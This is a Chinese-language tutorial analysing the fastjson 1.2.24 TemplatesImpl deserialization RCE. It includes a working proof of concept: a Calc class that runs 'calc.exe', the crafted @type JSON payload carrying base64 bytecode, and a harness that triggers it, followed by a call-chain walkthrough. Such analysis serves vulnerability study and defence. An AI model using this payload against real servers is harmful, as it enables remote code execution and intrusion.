# fastjson 反序列化漏洞详解（TemplatesImpl）

> `apache common collections`以及Spring RCE都是利用了`readObject`方法进行利用链触发的。`fastjson`的反序列化则是利用了目标类的`set`方法与`get`方法，因为这两个方法是`fastjson`在进行反序列化时需要调用的方法。
>
> `fastjson`是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过1w8，在2017年3月15日，`fastjson`官方主动爆出`fastjson`在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://github.com/alibaba/fastjson/wiki/security_update_20170315

## POC

这是一个简单的弹出计算器的类，编译`Calc.java`获得`Calc.class`。为了下一步的poc使用。

```
package SpringJDNI;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
public class Calc extends AbstractTranslet {
    public Calc() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        Calc t = new Calc();
    }
}
```

这是POC最核心的部分就是将`_bytecodes`进行赋值，其中`@type`可以指定反序列化任意类，并调用其中的`set，get，is`方法，`fastjson`默认开启`type`属性。`Json`字符串需要吧`@type`放在最前边，否则无法利用。这里的`_bytecodes`就是将之前生成的`Calc.class`，进行base64编码后的字符串。

```
{    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes":["base64编码后的继承于AbstractTranslet类的子类的class文件"],
    '_name':'a.b',
    '_tfactory':{ },
    "_outputProperties":{ },
    "_version":"1.0",
    "allowedProtocols":"all"
}
```

完整的POC如下，就是将构造的`json`进行了`parseObject`操作，直接触发计算器的弹出。

```
package SpringJDNI;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class TemplatesImplPOC {
    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy( new FileInputStream( new File( cls ) ), bos );
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String( bos.toByteArray() );
    }

    public static void test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty( "file.separator" );
        final String evilClassPath = System.getProperty( "user.dir" ) + "\\target\\classes\\SpringJDNI\\Calc.class";
        String evilCode = readClass( evilClassPath );
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +"\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println( text1 );
        
		// _bytecodes 是Templateslmpl的私有属性，因此在parseObjecct的时候需要设置Feature.SupportNonPublicField 否则 _bytecodes 无法进行序列化
        Object obj = JSON.parseObject( text1, Object.class, config, Feature.SupportNonPublicField );
    }

    public static void main(String args[]) {
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## parse 与 parseObject

`FastJson`中的`parse`和`parseObject`方法都可以用来将JSON字符串反序列化成Java对象，`parseObject()`本质上也是调用`parse()`进行反序列化的。但是`parseObject()`会额外的将Java对象转为 `JSONObject`对象，即`JSON.toJSON()`。所以在于`parse()`会识别并调用目标类的`setter`方法及某些特定条件的`getter`方法，而 `parseObject()` 会调用目标类的**所有** `setter` 和 `getter` 方法。

```
package JavaUnser;

import com.alibaba.fastjson.JSON;

public class babyFastjson {

    public String name;
    public int age;
    private String grade;

    public String getName() {
        System.out.println("getter of name");
        return name;
    }

    public void setName(String name) {
        System.out.println("setter of name");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getter of age");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setter of age");
        this.age = age;
    }

    public String getGrade() {
        System.out.println("getter of grade");
        return grade;
    }

    public void setGrade(String grade) {
        System.out.println("setter of grade");
        this.grade = grade;
    }


    public static void main(String args[]) throws Exception{
        String jsonStr="{\"@type\":\"JavaUnser.babyFastjson\",\"name\":\"Sun\",\"age\":23,\"grade\":\"Class 4\"}";

        Object user1 = JSON.parseObject(jsonStr);
        System.out.println( user1 );
        System.out.println();
        Object user2 = JSON.parse(jsonStr);
        System.out.println( user2 );
    }
}
```

```
setter of name
setter of age
setter of grade
getter of age
getter of grade
getter of name
{"name":"Sun","age":23,"grade":"Class 4"}

setter of name
setter of age
setter of grade
JavaUnser.babyFastjson@1f96a21e
```

### Fastjson反序列化到java类时主要逻辑

1. 获取并保存目标java类中的成员变量setter、getter。（由`JavaBeanInfo.build()`进行处理，`Fastjson`会创建一个`filedList`数组，用来保存目标java类的成员变量以及相应的`setter`和`getter`方法信息，以供后续反序列化字段时使用）

   - 识别`setter`方法名，并且根据`setter`方法名提取出成员变量名
   - 通过`clazz.getField()`获取成员变量
   - 识别`getter`方法名，并根据`getter`方法名提取出成员变量名

2. 解析JSON字符串，对逐个字段进行处理，调用相应的`setter`、`getter`进行变量赋值。（`parseField()`进行处理，根据字段key，调用`fieldList`数组中存储的相应方法进行变量初始化赋值）

   ```
   JavaBeanDeserializer
   
   public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
                                 Map<String, Object> fieldValues) {
           JSONLexer lexer = parser.lexer; 
           
           // smartMatch() ，就是将字段key中的_替换掉，从而将_outputProperties 和 OutputProperties 可以成功关联上。
           FieldDeserializer fieldDeserializer = smartMatch(key);
   
           ...
           return true;
       }
   ```

## 调用链

由于`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类的`outputProperties`属性类型为`Properties`，因此在反序列化时会调用该类的`getOutputProperties`方法。

![1558156601121](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558156601121.png)

进一步跟进`newTransformer().getOutputProperties()`

![1558156675562](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558156675562.png)

需要实例化一个`TransformerImpl`类的对象，跟进`getTransletInstance()`方向

![1558156764339](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558156764339.png)

继续跟进`defineTransletClasses()`，可以看到就是对我们输入的`_bytecodes`进行遍历，执行`loader.defineClass()`方法。`_bytecodes`字节数组创建一个`_class`，`_bytecodes`加载到`_class`中。

![1558156927188](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558156927188.png)

执行完`defineTransletClasses()`，返回到`getTransletInstance()`，然后根据`_class`,用`newInstance`生成一个java实例。生成的实例就是我们穿进去的恶意类的实例。因此可以执行恶意代码。

![1558157961686](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558157961686.png)

下断点调试一下就可以看到。

![1558158637834](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558158637834.png)

查看一下调用链的过程。这里不一步一步的讲啦，有兴趣的可以自己去跟进一下就可以了。

![1558158718030](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558158718030.png)

然后再进行单步跳过就可以看到已经弹出了计算器了。

![1558158824290](https://github.com/sunSUNQ/Java_learning/raw/master/Fastjson_Unserialize_TemplatesImpl/image/1558158824290.png)

## 参考链接

[Fastjson 远程反序列化程序验证的构造和分析](https://paper.seebug.org/292/)

[FastJson 反序列化漏洞利用的三个细节 - TemplatesImpl 利用链](https://paper.seebug.org/636/#1-parse-parseobject)

[小白都能看懂的JSON反序列化远程命令执行](http://www.52bug.cn/hkjs/4686.html)

[Java反序列化漏洞的一些利用链分析](https://www.anquanke.com/post/id/173459#h2-9)

[Fastjson 远程反序列化程序验证的构造和分析](https://paper.seebug.org/292/)
